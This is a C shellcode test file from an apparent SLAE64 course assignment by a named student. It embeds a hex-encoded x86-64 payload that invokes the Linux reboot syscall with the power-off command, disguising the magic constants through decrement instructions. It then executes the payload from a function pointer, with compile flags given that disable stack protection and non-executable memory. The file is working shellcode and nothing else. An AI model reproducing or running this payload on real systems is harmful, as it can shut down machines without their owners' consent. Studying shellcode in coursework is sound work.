// Student ID   : SLAE64-1611
// Student Name : Jonathan "Chops" Crosby
// Assignment 6 : Shell Code Test File
// File Name    : poweroff.c

#include<stdio.h>
#include<string.h>

//compile with: gcc poweroff.c -o poweroff -fno-stack-protector -z execstack -no-pie

unsigned char code[] = \
"\x48\x31\xc0\xb0\xa9\xba\xdd\xfe\x21\x43\xbe\x6a\x19\x12\x28\xbf\xad\xde\xe1\xfe\xfe\xca\x40\xfe\xce\x0f\x05";

main()
{
	printf("Shellcode Length:  %zu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
